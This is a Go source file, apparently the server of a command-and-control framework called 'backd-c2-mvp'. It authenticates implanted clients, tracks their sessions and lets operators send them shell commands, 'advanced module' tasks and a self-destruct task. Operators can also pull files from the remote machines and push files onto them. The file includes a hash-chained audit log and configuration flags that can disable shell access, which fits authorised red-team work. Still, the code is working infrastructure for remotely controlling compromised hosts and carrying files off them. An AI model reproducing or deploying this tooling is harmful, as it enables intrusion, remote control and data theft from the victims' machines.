package bdc2

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------------------------------------------------------------------------
// Audit log (JSON lines)
// ---------------------------------------------------------------------------

type Audit struct {
	f        *os.File
	path     string
	mu       sync.Mutex
	lastHash string // hex sha256 of the previous record (hash chain)
	chain    bool
}

const auditGenesis = "0000000000000000000000000000000000000000000000000000000000000000"

func NewAudit(path string, chain bool) (*Audit, error) {
	if path == "" {
		return &Audit{chain: chain}, nil
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil && filepath.Dir(path) != "." {
		return nil, err
	}
	f, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o640)
	if err != nil {
		return nil, err
	}
	a := &Audit{f: f, path: path, chain: chain, lastHash: auditGenesis}
	if chain {
		a.resumeChain()
	}
	return a, nil
}

// resumeChain loads the hash of the last record so an appended chain stays
// verifiable across restarts.
func (a *Audit) resumeChain() {
	b, err := os.ReadFile(a.path)
	if err != nil || len(b) == 0 {
		return
	}
	lines := strings.Split(strings.TrimSpace(string(b)), "\n")
	last := lines[len(lines)-1]
	var rec map[string]any
	if json.Unmarshal([]byte(last), &rec) == nil {
		if h, ok := rec["hash"].(string); ok && h != "" {
			a.lastHash = h
		}
	}
}

func (a *Audit) Log(actor, action, detail string, sid uint64) {
	if a == nil || a.f == nil {
		return
	}
	rec := map[string]any{
		"ts":      time.Now().UTC().Format(time.RFC3339Nano),
		"actor":   actor,
		"action":  action,
		"detail":  detail,
		"session": sid,
	}
	a.mu.Lock()
	if a.chain {
		rec["prev"] = a.lastHash
		b, _ := json.Marshal(rec) // canonical field order for hashing
		sum := sha256.Sum256(b)
		rec["hash"] = hex.EncodeToString(sum[:])
		a.lastHash = rec["hash"].(string)
		b2, _ := json.Marshal(rec)
		a.f.Write(append(b2, '\n'))
	} else {
		b, _ := json.Marshal(rec)
		a.f.Write(append(b, '\n'))
	}
	a.mu.Unlock()
}

// VerifyAuditChain walks a JSON-lines audit file and returns the number of
// verified records plus the first broken line (0 when the chain is intact).
func VerifyAuditChain(path string) (int, int, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		return 0, 0, err
	}
	prev := auditGenesis
	n := 0
	for _, line := range strings.Split(strings.TrimSpace(string(b)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var rec map[string]any
		if err := json.Unmarshal([]byte(line), &rec); err != nil {
			return n, n + 1, fmt.Errorf("line %d: %w", n+1, err)
		}
		got, _ := rec["hash"].(string)
		if got == "" {
			return n, n + 1, fmt.Errorf("line %d: missing hash", n+1)
		}
		if p, _ := rec["prev"].(string); p != prev {
			return n, n + 1, fmt.Errorf("line %d: prev mismatch", n+1)
		}
		delete(rec, "hash")
		raw, _ := json.Marshal(rec)
		sum := sha256.Sum256(raw)
		if hex.EncodeToString(sum[:]) != got {
			return n, n + 1, fmt.Errorf("line %d: hash mismatch", n+1)
		}
		prev = got
		n++
	}
	return n, 0, nil
}

func (a *Audit) Close() {
	if a != nil && a.f != nil {
		a.f.Close()
	}
}

// ---------------------------------------------------------------------------
// File transfer
// ---------------------------------------------------------------------------

type Xfer struct {
	ID         string
	SID        uint64
	RemotePath string
	Dir        string // to_server | to_client
	Size       int64
	SHA        string
	LocalPath  string
	Status     string
	Err        string
	mu         sync.Mutex
	f          *os.File
	written    int64
	done       chan struct{}
	closed     atomic.Bool
}

// ---------------------------------------------------------------------------
// Session
// ---------------------------------------------------------------------------

type TaskResult struct {
	Status string
	Out    []byte
	Err    string
}

type Session struct {
	hub      *Hub
	ID       uint64
	ClientID string
	OS       string
	Arch     string
	Ver      string
	Addr     string
	conn     *WSConn
	key      []byte
	created  time.Time

	lastSeen atomic.Int64

	sendMu  sync.Mutex
	sendSeq uint32

	recvMu  sync.Mutex
	recvSeq uint32

	pendingMu sync.Mutex
	pending   map[string]chan TaskResult

	xferMu sync.Mutex
	xfers  map[string]*Xfer

	// merged #4833 capabilities: per-connection token bucket and a bounded
	// in-flight task queue (serialised admission, results keyed by task id).
	rl      *bucket
	taskSem chan struct{}

	closed atomic.Bool
}

// allowMsg applies the configured per-connection message rate limit.
func (s *Session) allowMsg() bool {
	if s.rl == nil {
		return true
	}
	return s.rl.allow()
}

func (s *Session) sendFrame(typ uint8, kv []KV) error {
	payload := EncodeTLV(kv)
	s.sendMu.Lock()
	seq := s.sendSeq + 1
	s.sendSeq = seq
	frame, err := SealFrame(s.key, typ, 0, s.ID, seq, DirServerToClient, payload)
	s.sendMu.Unlock()
	if err != nil {
		return err
	}
	return s.conn.WriteBinary(frame)
}

func (s *Session) acceptSeq(seq uint32) bool {
	s.recvMu.Lock()
	defer s.recvMu.Unlock()
	if seq <= s.recvSeq {
		return false
	}
	s.recvSeq = seq
	return true
}

func (s *Session) Task(kind string, kv []KV, timeout time.Duration, actor string) TaskResult {
	// Admission control: at most TaskMaxInflight concurrent tasks per session.
	// A nil/zero-length channel means "unlimited" (kept for backwards compat).
	if s.taskSem != nil {
		select {
		case s.taskSem <- struct{}{}:
			defer func() { <-s.taskSem }()
		case <-time.After(timeout):
			return TaskResult{Status: "error", Err: "task queue full"}
		}
	}
	attempts := s.hub.Cfg().TaskMaxAttempts
	if attempts < 1 {
		attempts = 1
	}
	var last TaskResult
	for attempt := 1; attempt <= attempts; attempt++ {
		last = s.taskOnce(kind, kv, timeout, actor)
		// Only timeouts are retried: re-running a shell/file task that
		// actually executed would be unsafe.
		if last.Status != "error" || last.Err != "timeout" || attempt == attempts {
			break
		}
		s.hub.audit.Log(actor, "task_retry", fmt.Sprintf("%s attempt=%d", kind, attempt+1), s.ID)
	}
	if max := s.hub.Cfg().TaskOutputMax; max > 0 && len(last.Out) > max {
		last.Out = last.Out[:max]
		if last.Err == "" {
			last.Err = fmt.Sprintf("output truncated to %d bytes", max)
		}
	}
	return last
}

func (s *Session) taskOnce(kind string, kv []KV, timeout time.Duration, actor string) TaskResult {
	id := fmt.Sprintf("t%d", randU64())
	ch := make(chan TaskResult, 1)
	s.pendingMu.Lock()
	s.pending[id] = ch
	s.pendingMu.Unlock()
	defer func() {
		s.pendingMu.Lock()
		delete(s.pending, id)
		s.pendingMu.Unlock()
	}()
	kvs := append([]KV{S("task", id), S("kind", kind)}, kv...)
	if err := s.sendFrame(TypeTask, kvs); err != nil {
		return TaskResult{Status: "error", Err: err.Error()}
	}
	s.hub.audit.Log(actor, "task_send", kind, s.ID)
	select {
	case r := <-ch:
		s.hub.audit.Log(actor, "task_result", kind+" status="+r.Status, s.ID)
		return r
	case <-time.After(timeout):
		return TaskResult{Status: "error", Err: "timeout"}
	}
}

func (s *Session) addXfer(x *Xfer) {
	s.xferMu.Lock()
	s.xfers[x.ID] = x
	s.xferMu.Unlock()
}

func (s *Session) getXfer(id string) *Xfer {
	s.xferMu.Lock()
	defer s.xferMu.Unlock()
	return s.xfers[id]
}

func (s *Session) close() {
	if s.closed.Swap(true) {
		return
	}
	s.conn.Close()
}

// ---------------------------------------------------------------------------
// Hub
// ---------------------------------------------------------------------------

type Hub struct {
	cfgPtr     atomic.Pointer[Config]
	clientKeys map[string][]byte
	opKeys     map[string][]byte
	audit      *Audit
	start      time.Time

	mu       sync.RWMutex
	sessions map[uint64]*Session
	byClient map[string]*Session
	nextID   atomic.Uint64

	nonceMu sync.Mutex
	nonces  map[string]time.Time

	configPath string
}

// SetConfigPath records the file used for operator-triggered hot reload.
func (h *Hub) SetConfigPath(p string) { h.configPath = p }

// Stats returns runtime counters exposed through OP_LIST_RESULT (additive
// payload keys; the frozen v1 frame format is unchanged).
func (h *Hub) Stats() map[string]any {
	c := h.Cfg()
	h.mu.RLock()
	n := len(h.sessions)
	h.mu.RUnlock()
	return map[string]any{
		"uptime_sec":          int(time.Since(h.start).Seconds()),
		"sessions":            n,
		"max_sessions":        c.MaxSessions,
		"heartbeat_sec":       c.HeartbeatSec,
		"session_timeout":     c.SessionTimeoutSec,
		"task_max_inflight":   c.TaskMaxInflight,
		"task_max_attempts":   c.TaskMaxAttempts,
		"client_msgs_per_sec": c.ClientMsgsPerSec,
		"allow_shell":         c.AllowShell,
		"allow_advanced":      c.AllowAdvanced,
		"audit_hash_chain":    c.HashChain(),
		"proto":               "BDC2 v1",
	}
}

// Cfg returns the current configuration. Reload swaps the pointer atomically,
// so every read path sees a consistent snapshot.
func (h *Hub) Cfg() *Config { return h.cfgPtr.Load() }

// bucket is a small token bucket used for per-connection rate limiting
// (merged from #4833's limits client_msgs_per_sec / operator_msgs_per_sec).
type bucket struct {
	mu     sync.Mutex
	tokens float64
	last   time.Time
	rate   float64
	burst  float64
}

func newBucket(perSec int) *bucket {
	if perSec <= 0 {
		perSec = 100
	}
	return &bucket{tokens: float64(perSec), last: time.Now(), rate: float64(perSec), burst: float64(perSec) * 2}
}

func (b *bucket) allow() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	now := time.Now()
	b.tokens += now.Sub(b.last).Seconds() * b.rate
	b.last = now
	if b.tokens > b.burst {
		b.tokens = b.burst
	}
	if b.tokens < 1 {
		return false
	}
	b.tokens--
	return true
}

func NewHub(cfg *Config, ck, ok map[string][]byte, audit *Audit) (*Hub, error) {
	if err := os.MkdirAll(cfg.FilesDir, 0o750); err != nil {
		return nil, err
	}
	h := &Hub{
		clientKeys: ck,
		opKeys:     ok,
		audit:      audit,
		start:      time.Now(),
		sessions:   make(map[uint64]*Session),
		byClient:   make(map[string]*Session),
		nonces:     make(map[string]time.Time),
	}
	h.cfgPtr.Store(cfg)
	go h.janitor()
	return h, nil
}

// Reload re-reads the config file and swaps the runtime configuration. Only
// listener addresses cannot change without a restart; everything else
// (heartbeat, timeouts, limits, allow flags, PSKs) takes effect immediately.
// This is the #4833 "hot reload" capability expressed on the frozen BDC2 v1
// wire protocol (operator sends OP_LIST with reload=1; no new frame type).
func (h *Hub) Reload(path string) (*Config, error) {
	nc, err := LoadConfig(path)
	if err != nil {
		return nil, err
	}
	ck, err := nc.ClientKeys()
	if err != nil {
		return nil, err
	}
	ok, err := nc.OperatorKeys()
	if err != nil {
		return nil, err
	}
	old := h.Cfg()
	if old.ClientListen != nc.ClientListen || old.OperatorListen != nc.OperatorListen {
		return nil, fmt.Errorf("listener addresses require restart")
	}
	h.clientKeys = ck
	h.opKeys = ok
	h.cfgPtr.Store(nc)
	h.audit.Log("server", "reload", path, 0)
	return nc, nil
}

func (h *Hub) clientKey(id string) ([]byte, bool) {
	if k, ok := h.clientKeys[id]; ok {
		return k, true
	}
	if k, ok := h.clientKeys[""]; ok {
		return k, true
	}
	return nil, false
}

func (h *Hub) acceptNonce(scope string, nonce []byte) bool {
	sum := sha256.Sum256(append([]byte(scope+"|"), nonce...))
	k := hex.EncodeToString(sum[:])
	now := time.Now()
	h.nonceMu.Lock()
	defer h.nonceMu.Unlock()
	if exp, ok := h.nonces[k]; ok && now.Before(exp) {
		return false
	}
	h.nonces[k] = now.Add(10 * time.Minute)
	if len(h.nonces) > 10000 {
		for key, exp := range h.nonces {
			if now.After(exp) {
				delete(h.nonces, key)
			}
		}
	}
	return true
}

func (h *Hub) register(s *Session) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	if len(h.sessions) >= h.Cfg().MaxSessions {
		return fmt.Errorf("max sessions reached")
	}
	if old, ok := h.byClient[s.ClientID]; ok && old.ID != s.ID {
		go func() {
			old.sendFrame(TypeNotice, []KV{S("reason", "replaced by new connection")})
			old.close()
		}()
	}
	h.sessions[s.ID] = s
	h.byClient[s.ClientID] = s
	return nil
}

func (h *Hub) unregister(s *Session) {
	h.mu.Lock()
	if cur, ok := h.sessions[s.ID]; ok && cur == s {
		delete(h.sessions, s.ID)
	}
	if cur, ok := h.byClient[s.ClientID]; ok && cur == s {
		delete(h.byClient, s.ClientID)
	}
	h.mu.Unlock()
	// release open transfers
	s.xferMu.Lock()
	for _, x := range s.xfers {
		x.mu.Lock()
		if x.f != nil {
			x.f.Close()
			x.f = nil
		}
		if x.Status == "pending" {
			x.Status = "aborted"
		}
		x.mu.Unlock()
	}
	s.xferMu.Unlock()
}

func (h *Hub) Get(id uint64) *Session {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.sessions[id]
}

func (h *Hub) List() []map[string]any {
	h.mu.RLock()
	defer h.mu.RUnlock()
	out := make([]map[string]any, 0, len(h.sessions))
	for _, s := range h.sessions {
		out = append(out, map[string]any{
			"id":        s.ID,
			"client_id": s.ClientID,
			"os":        s.OS,
			"arch":      s.Arch,
			"ver":       s.Ver,
			"addr":      s.Addr,
			"last_seen": time.Unix(0, s.lastSeen.Load()).UTC().Format(time.RFC3339),
		})
	}
	return out
}

func (h *Hub) janitor() {
	t := time.NewTicker(5 * time.Second)
	defer t.Stop()
	for range t.C {
		limit := time.Now().Add(-time.Duration(h.Cfg().SessionTimeoutSec) * time.Second).UnixNano()
		var dead []*Session
		h.mu.RLock()
		for _, s := range h.sessions {
			if s.lastSeen.Load() < limit {
				dead = append(dead, s)
			}
		}
		h.mu.RUnlock()
		for _, s := range dead {
			h.audit.Log("janitor", "session_timeout", s.ClientID, s.ID)
			s.close()
		}
	}
}

func (h *Hub) CloseAll() {
	h.mu.RLock()
	var ss []*Session
	for _, s := range h.sessions {
		ss = append(ss, s)
	}
	h.mu.RUnlock()
	for _, s := range ss {
		s.close()
	}
}

// ---------------------------------------------------------------------------
// Client endpoint
// ---------------------------------------------------------------------------

func (h *Hub) ServeClient(w http.ResponseWriter, r *http.Request) {
	ws, err := UpgradeServer(w, r, h.Cfg().MaxFrameBytes)
	if err != nil {
		http.Error(w, "bad websocket", http.StatusBadRequest)
		return
	}
	defer ws.Close()

	ws.SetReadDeadline(time.Now().Add(15 * time.Second))
	op, data, err := ws.ReadMessage()
	if err != nil || op != 0x2 {
		return
	}
	typ, flags, _, _, payload, err := OpenFrame(nil, data, DirClientToServer)
	if err != nil || typ != TypeHello || flags&FlagCleartext == 0 {
		return
	}
	tlv, err := DecodeTLV(payload)
	if err != nil {
		return
	}
	id := string(tlv["id"])
	nonce := tlv["nonce"]
	mac := tlv["mac"]
	if id == "" || len(nonce) != 16 || len(mac) != 32 {
		return
	}
	psk, ok := h.clientKey(id)
	if !ok {
		h.audit.Log("server", "hello_reject", "unknown client id="+id, 0)
		return
	}
	if !hmac.Equal(mac, HelloMAC(psk, []byte(id), nonce)) {
		h.audit.Log("server", "hello_reject", "bad mac id="+id, 0)
		return
	}
	if !h.acceptNonce("c:"+id, nonce) {
		h.audit.Log("server", "hello_reject", "replayed hello id="+id, 0)
		return
	}
	key, err := HelloKey(psk, []byte(id), nonce)
	if err != nil {
		return
	}
	s := &Session{
		hub:      h,
		ID:       h.nextID.Add(1),
		ClientID: id,
		OS:       string(tlv["os"]),
		Arch:     string(tlv["arch"]),
		Ver:      string(tlv["ver"]),
		Addr:     ws.RemoteAddr().String(),
		conn:     ws,
		key:      key,
		created:  time.Now(),
		pending:  make(map[string]chan TaskResult),
		xfers:    make(map[string]*Xfer),
		rl:       newBucket(h.Cfg().ClientMsgsPerSec),
		taskSem:  make(chan struct{}, h.Cfg().TaskMaxInflight),
	}
	s.lastSeen.Store(time.Now().UnixNano())
	if err := h.register(s); err != nil {
		s.sendFrame(TypeError, []KV{S("code", "busy"), S("msg", err.Error())})
		return
	}
	defer h.unregister(s)
	h.audit.Log("client", "session_open", id+" from "+s.Addr, s.ID)
	defer h.audit.Log("client", "session_close", id, s.ID)

	hb := h.Cfg().HeartbeatSec
	if err := s.sendFrame(TypeHelloAck, []KV{
		S("sid", strconv.FormatUint(s.ID, 10)),
		S("heartbeat", strconv.Itoa(hb)),
		S("jitter", strconv.Itoa(h.Cfg().JitterPct)),
		S("server", "backd-c2-mvp"),
	}); err != nil {
		return
	}
	ws.SetReadDeadline(time.Time{})

	for {
		op, data, err := ws.ReadMessage()
		if err != nil {
			return
		}
		if op != 0x2 {
			continue
		}
		typ, flags, sid, sq, payload, err := OpenFrame(s.key, data, DirClientToServer)
		if err != nil || flags&FlagCleartext != 0 {
			h.audit.Log("client", "frame_reject", fmt.Sprintf("type=%d err=%v", typ, err), s.ID)
			return
		}
		if sid != s.ID || !s.acceptSeq(sq) {
			return
		}
		if !s.allowMsg() {
			h.audit.Log("client", "rate_limit", "client="+s.ClientID, s.ID)
			return
		}
		s.lastSeen.Store(time.Now().UnixNano())
		kt, _ := DecodeTLV(payload)
		switch typ {
		case TypePing:
			s.sendFrame(TypePong, []KV{B("t", kt["t"])})
		case TypeTaskResult:
			tid := string(kt["task"])
			s.pendingMu.Lock()
			ch := s.pending[tid]
			s.pendingMu.Unlock()
			if ch != nil {
				ch <- TaskResult{Status: string(kt["status"]), Out: kt["out"], Err: string(kt["err"])}
			}
		case TypeFileChunk:
			h.handleChunk(s, kt)
		case TypeFileAck:
			id := string(kt["xfer"])
			s.pendingMu.Lock()
			ch := s.pending["file:"+id]
			s.pendingMu.Unlock()
			if ch != nil {
				ch <- TaskResult{Status: string(kt["status"]), Out: kt["sha"], Err: string(kt["err"])}
			}
		case TypeError:
			log.Printf("client %s error: %s", s.ClientID, string(kt["msg"]))
		}
	}
}

func (h *Hub) handleChunk(s *Session, kt map[string][]byte) {
	id := string(kt["xfer"])
	x := s.getXfer(id)
	if x == nil || x.Dir != "to_server" {
		return
	}
	off, _ := strconv.ParseInt(string(kt["off"]), 10, 64)
	data := kt["data"]
	final := string(kt["final"]) == "1"
	x.mu.Lock()
	if x.f == nil || x.Status != "pending" {
		x.mu.Unlock()
		return
	}
	if off != x.written {
		x.Err = fmt.Sprintf("offset mismatch got=%d want=%d", off, x.written)
		x.Status = "error"
		x.f.Close()
		x.f = nil
		x.mu.Unlock()
		close(x.done)
		return
	}
	n, err := x.f.Write(data)
	x.written += int64(n)
	if err != nil {
		x.Err = err.Error()
		x.Status = "error"
	}
	x.mu.Unlock()
	if final {
		h.finishPull(s, x)
	}
}

func (h *Hub) finishPull(s *Session, x *Xfer) {
	x.mu.Lock()
	if x.f != nil {
		x.f.Sync()
		x.f.Close()
		x.f = nil
	}
	x.Size = x.written
	path := x.LocalPath
	status := x.Status
	x.mu.Unlock()
	if status == "pending" {
		f, err := os.Open(path)
		if err != nil {
			x.mu.Lock()
			x.Err, x.Status = err.Error(), "error"
			x.mu.Unlock()
		} else {
			hs := sha256.New()
			io.Copy(hs, f)
			f.Close()
			x.mu.Lock()
			x.SHA = hex.EncodeToString(hs.Sum(nil))
			x.Status = "done"
			x.mu.Unlock()
		}
	}
	x.closed.Store(true)
	close(x.done)
	h.audit.Log("client", "file_pull_done", fmt.Sprintf("%s size=%d sha=%s", x.RemotePath, x.Size, x.SHA), s.ID)
}

// NewPull asks the client to send a remote file to the server.
func (h *Hub) NewPull(s *Session, remote string, timeout time.Duration) (*Xfer, error) {
	id := fmt.Sprintf("f%d", randU64())
	path := filepath.Join(h.Cfg().FilesDir, id+".bin")
	f, err := os.Create(path)
	if err != nil {
		return nil, err
	}
	x := &Xfer{ID: id, SID: s.ID, RemotePath: remote, Dir: "to_server", LocalPath: path, Status: "pending", f: f, done: make(chan struct{})}
	s.addXfer(x)
	if err := s.sendFrame(TypeFileMeta, []KV{
		S("xfer", id), S("dir", "to_server"), S("file", remote),
	}); err != nil {
		return nil, err
	}
	select {
	case <-x.done:
	case <-time.After(timeout):
		x.mu.Lock()
		x.Status, x.Err = "timeout", "timeout"
		if x.f != nil {
			x.f.Close()
			x.f = nil
		}
		x.mu.Unlock()
		return x, fmt.Errorf("timeout")
	}
	x.mu.Lock()
	defer x.mu.Unlock()
	if x.Status != "done" {
		return x, fmt.Errorf("%s: %s", x.Status, x.Err)
	}
	return x, nil
}

// PushFile sends bytes to the client, which writes them to remote. baseOff
// resumes an interrupted upload: the client seeks to baseOff before writing
// (merged #4833 file resume, expressed with the existing FILE_META/FILE_CHUNK
// offset fields).
func (h *Hub) PushFile(s *Session, remote string, data []byte, baseOff int64, timeout time.Duration, actor string) TaskResult {
	id := fmt.Sprintf("f%d", randU64())
	ch := make(chan TaskResult, 1)
	s.pendingMu.Lock()
	s.pending["file:"+id] = ch
	s.pendingMu.Unlock()
	defer func() {
		s.pendingMu.Lock()
		delete(s.pending, "file:"+id)
		s.pendingMu.Unlock()
	}()
	sum := sha256.Sum256(data)
	if err := s.sendFrame(TypeFileMeta, []KV{
		S("xfer", id), S("dir", "to_client"), S("file", remote),
		S("off", strconv.FormatInt(baseOff, 10)),
		S("size", strconv.Itoa(len(data))), S("sha", hex.EncodeToString(sum[:])),
	}); err != nil {
		return TaskResult{Status: "error", Err: err.Error()}
	}
	const chunk = 48 * 1024
	for off := 0; off < len(data); off += chunk {
		end := off + chunk
		if end > len(data) {
			end = len(data)
		}
		final := ""
		if end == len(data) {
			final = "1"
		}
		if err := s.sendFrame(TypeFileChunk, []KV{
			S("xfer", id), S("off", strconv.FormatInt(baseOff+int64(off), 10)),
			B("data", data[off:end]), S("final", final),
		}); err != nil {
			return TaskResult{Status: "error", Err: err.Error()}
		}
	}
	h.audit.Log(actor, "file_push_send", fmt.Sprintf("%s size=%d", remote, len(data)), s.ID)
	select {
	case r := <-ch:
		return r
	case <-time.After(timeout):
		return TaskResult{Status: "error", Err: "timeout"}
	}
}

// StreamXferTo writes an assembled file to a writer in OP_FILE_CHUNK frames.
func (h *Hub) StreamXferTo(send func(uint8, []KV) error, id string) error {
	h.mu.RLock()
	var x *Xfer
	for _, s := range h.sessions {
		if got := s.getXfer(id); got != nil {
			x = got
			break
		}
	}
	h.mu.RUnlock()
	if x == nil {
		return fmt.Errorf("xfer %s not found", id)
	}
	x.mu.Lock()
	path, size, sha, status := x.LocalPath, x.Size, x.SHA, x.Status
	x.mu.Unlock()
	if status != "done" {
		return fmt.Errorf("xfer %s status=%s", id, status)
	}
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()
	const chunk = 48 * 1024
	buf := make([]byte, chunk)
	var off int64
	for {
		n, err := f.Read(buf)
		if n > 0 {
			if e := send(TypeOpFileChunk, []KV{B("data", buf[:n])}); e != nil {
				return e
			}
			off += int64(n)
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}
	}
	return send(TypeOpFileDone, []KV{S("size", strconv.FormatInt(size, 10)), S("sha", sha), S("xfer", id)})
}

// ---------------------------------------------------------------------------
// Operator endpoint
// ---------------------------------------------------------------------------

func (h *Hub) ServeOperator(w http.ResponseWriter, r *http.Request) {
	ws, err := UpgradeServer(w, r, h.Cfg().MaxFrameBytes)
	if err != nil {
		http.Error(w, "bad websocket", http.StatusBadRequest)
		return
	}
	defer ws.Close()
	ws.SetReadDeadline(time.Now().Add(15 * time.Second))
	op, data, err := ws.ReadMessage()
	if err != nil || op != 0x2 {
		return
	}
	typ, flags, _, _, payload, err := OpenFrame(nil, data, DirOperToServer)
	if err != nil || typ != TypeAuth || flags&FlagCleartext == 0 {
		return
	}
	tlv, err := DecodeTLV(payload)
	if err != nil {
		return
	}
	user := string(tlv["user"])
	nonce := tlv["nonce"]
	mac := tlv["mac"]
	psk, ok := h.opKeys[user]
	if !ok || len(nonce) != 16 {
		h.audit.Log("server", "op_auth_reject", "unknown user="+user, 0)
		return
	}
	if !hmac.Equal(mac, OperatorAuthMAC(psk, user, nonce)) {
		h.audit.Log("server", "op_auth_reject", "bad mac user="+user, 0)
		return
	}
	if !h.acceptNonce("o:"+user, nonce) {
		return
	}
	key, err := OperatorKey(psk, user)
	if err != nil {
		return
	}
	ws.SetReadDeadline(time.Time{})
	opRL := newBucket(h.Cfg().OperatorMsgsPerSec)
	var seq uint32
	var opRecv uint32
	seq++
	first, _ := SealFrame(key, TypeAuthOK, 0, 0, seq, DirServerToOper, EncodeTLV([]KV{S("user", user), S("server", "backd-c2-mvp")}))
	if err := ws.WriteBinary(first); err != nil {
		return
	}
	h.audit.Log("operator:"+user, "op_login", ws.RemoteAddr().String(), 0)
	defer h.audit.Log("operator:"+user, "op_logout", "", 0)

	send := func(t uint8, kv []KV) error {
		seq++
		frame, err := SealFrame(key, t, 0, 0, seq, DirServerToOper, EncodeTLV(kv))
		if err != nil {
			return err
		}
		return ws.WriteBinary(frame)
	}

	for {
		op, data, err := ws.ReadMessage()
		if err != nil {
			return
		}
		if op != 0x2 {
			continue
		}
		t, _, _, sq, payload, err := OpenFrame(key, data, DirOperToServer)
		if err != nil {
			h.audit.Log("operator:"+user, "op_frame_reject", err.Error(), 0)
			return
		}
		if sq <= opRecv {
			h.audit.Log("operator:"+user, "op_frame_reject", "replay/out-of-order", 0)
			return
		}
		opRecv = sq
		if !opRL.allow() {
			h.audit.Log("operator:"+user, "rate_limit", "", 0)
			send(TypeError, []KV{S("msg", "rate limited")})
			continue
		}
		kv, err := DecodeTLV(payload)
		if err != nil {
			continue
		}
		actor := "operator:" + user
		switch t {
		case TypeOpList:
			kvs := []KV{}
			if string(kv["reload"]) != "" && string(kv["reload"]) != "0" {
				path := string(kv["config"])
				if path == "" {
					path = h.configPath
				}
				if path == "" {
					kvs = append(kvs, S("reload_err", "no config path"))
				} else if _, err := h.Reload(path); err != nil {
					kvs = append(kvs, S("reload_err", err.Error()))
				} else {
					kvs = append(kvs, S("reloaded", "1"))
				}
			}
			b, _ := json.Marshal(h.List())
			st, _ := json.Marshal(h.Stats())
			kvs = append(kvs, B("sessions", b), B("stats", st))
			send(TypeOpListResult, kvs)
		case TypeOpTask:
			h.opTask(actor, kv, send)
		case TypeOpFilePull:
			h.opFilePull(actor, kv, send)
		case TypeOpFileFetch:
			if err := h.StreamXferTo(send, string(kv["xfer"])); err != nil {
				send(TypeError, []KV{S("msg", err.Error())})
			}
		case TypeOpFilePush:
			h.opFilePush(actor, kv, send)
		case TypeOpKill:
			sid, _ := strconv.ParseUint(string(kv["session"]), 10, 64)
			if s := h.Get(sid); s != nil {
				s.sendFrame(TypeNotice, []KV{S("reason", "killed by operator")})
				s.close()
				h.audit.Log(actor, "session_kill", s.ClientID, sid)
				send(TypeOpResult, []KV{S("status", "ok"), S("session", string(kv["session"]))})
			} else {
				send(TypeOpResult, []KV{S("status", "error"), S("err", "no such session")})
			}
		default:
			send(TypeError, []KV{S("msg", "unknown op type")})
		}
	}
}

func (h *Hub) opTask(actor string, kv map[string][]byte, send func(uint8, []KV) error) {
	sid, err := strconv.ParseUint(string(kv["session"]), 10, 64)
	if err != nil {
		send(TypeOpResult, []KV{S("status", "error"), S("err", "bad session")})
		return
	}
	s := h.Get(sid)
	if s == nil {
		send(TypeOpResult, []KV{S("status", "error"), S("err", "no such session")})
		return
	}
	kind := string(kv["kind"])
	if kind == KindShell && !h.Cfg().AllowShell {
		send(TypeOpResult, []KV{S("status", "error"), S("err", "shell disabled by server config")})
		return
	}
	if IsAdvanced(kind) && !h.Cfg().AllowAdvanced {
		send(TypeOpResult, []KV{S("status", "error"), S("err", "advanced modules disabled by server config (allow_advanced)")})
		return
	}
	if kind == KindSelfDestruct && string(kv["confirm"]) != "yes" {
		send(TypeOpResult, []KV{S("status", "error"), S("err", "selfdestruct requires confirm=yes")})
		return
	}
	to := 30 * time.Second
	if v, err := strconv.Atoi(string(kv["timeout"])); err == nil && v > 0 && v <= 600 {
		to = time.Duration(v) * time.Second
	}
	args := []KV{}
	if a := kv["args"]; len(a) > 0 {
		args = append(args, B("args", a))
	}
	r := s.Task(kind, args, to, actor)
	send(TypeOpResult, []KV{S("status", r.Status), B("out", r.Out), S("err", r.Err), S("session", string(kv["session"]))})
}

func (h *Hub) opFilePull(actor string, kv map[string][]byte, send func(uint8, []KV) error) {
	sid, _ := strconv.ParseUint(string(kv["session"]), 10, 64)
	s := h.Get(sid)
	if s == nil {
		send(TypeOpResult, []KV{S("status", "error"), S("err", "no such session")})
		return
	}
	remote := string(kv["file"])
	x, err := h.NewPull(s, remote, 60*time.Second)
	if err != nil {
		x.mu.Lock()
		status, errs := x.Status, x.Err
		x.mu.Unlock()
		send(TypeOpResult, []KV{S("status", status), S("err", errs), S("xfer", x.ID)})
		return
	}
	h.audit.Log(actor, "file_pull", remote+" -> "+x.ID, sid)
	send(TypeOpResult, []KV{S("status", "ok"), S("xfer", x.ID),
		S("size", strconv.FormatInt(x.Size, 10)), S("sha", x.SHA)})
}

func (h *Hub) opFilePush(actor string, kv map[string][]byte, send func(uint8, []KV) error) {
	sid, _ := strconv.ParseUint(string(kv["session"]), 10, 64)
	s := h.Get(sid)
	if s == nil {
		send(TypeOpResult, []KV{S("status", "error"), S("err", "no such session")})
		return
	}
	data := kv["data"]
	if len(data) > 8<<20 {
		send(TypeOpResult, []KV{S("status", "error"), S("err", "payload too large")})
		return
	}
	if max := h.Cfg().MaxFileSize; max > 0 && int64(len(data)) > max {
		send(TypeOpResult, []KV{S("status", "error"), S("err", "file exceeds max_file_size")})
		return
	}
	var off int64
	if v, err := strconv.ParseInt(string(kv["off"]), 10, 64); err == nil && v > 0 {
		off = v
	}
	r := h.PushFile(s, string(kv["file"]), data, off, 60*time.Second, actor)
	send(TypeOpResult, []KV{S("status", r.Status), S("sha", string(r.Out)), S("err", r.Err)})
}

func randU64() uint64 {
	b := randBytes(8)
	var v uint64
	for _, c := range b {
		v = v<<8 | uint64(c)
	}
	return v
}

// keep net import used
var _ = net.SplitHostPort
